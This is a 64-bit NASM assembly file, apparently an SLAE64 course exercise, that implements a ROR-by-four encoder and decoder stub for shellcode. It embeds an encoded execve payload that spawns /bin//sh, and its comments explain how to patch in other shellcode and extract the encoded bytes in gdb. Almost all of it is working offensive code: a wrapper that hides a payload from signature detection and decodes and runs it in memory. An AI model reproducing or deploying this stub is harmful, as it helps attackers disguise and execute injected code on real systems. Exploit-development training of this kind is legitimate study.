bits 64
; Filename: ror.nasm
; Author: Gitsnik SLAE64-1232
; Website:  http://dracyrys.com/
;
; Purpose:
;	Provide two way ror encoding of shellcode bytes.
;
; Strictly speaking, this is both the encoder and decoder
; stubs. Patch in your clean shellcode, compile the file
; get-sh.sh the result and drop it into a -ggdb compiled
; shellcode tester. When you run gdb and hit the
; shellcode defined int 0x03 (character \xcc in the shell
; output), type:
;
; x/24xb $rsi
;
; 24 here being the length of my execve() shellcode, your
; shellcode length will vary.
;
; The resulting bytes are your decoded shellcode. Add them
; to the bottom of the stub and it will encode them just
; as easily.
;

global _start
section .text
_start:
	jmp short caller

encoder:
	xor rcx, rcx
	mul rcx

	pop rsi
	lea rdi, [rsi]

	mov cl, codelen

encode:
	mov bl, byte [rsi + rax]	; Retrieve current byte of shellcode
	ror bl, 4			; Encode/ Decode it
	mov byte [rdi], bl		; Put it back where it belongs

	inc rdi				; Move to the next byte
	inc rax

	dec rcx				; Count down, make sure that we have
	jnz encode			; or have not reached the end of our
					; shellcode

	jmp short shellcode

caller:
	call encoder

	shellcode: db 0xa6,0xb3,0x85,0x99,0x84,0xbb,0xf2,0x26,0x96,0xe6,0xf2,0xf2,0x37,0x86,0x25,0x35,0x45,0xf5,0x25,0x75,0x45,0xe5,0xf0,0x50
	codelen equ $-shellcode
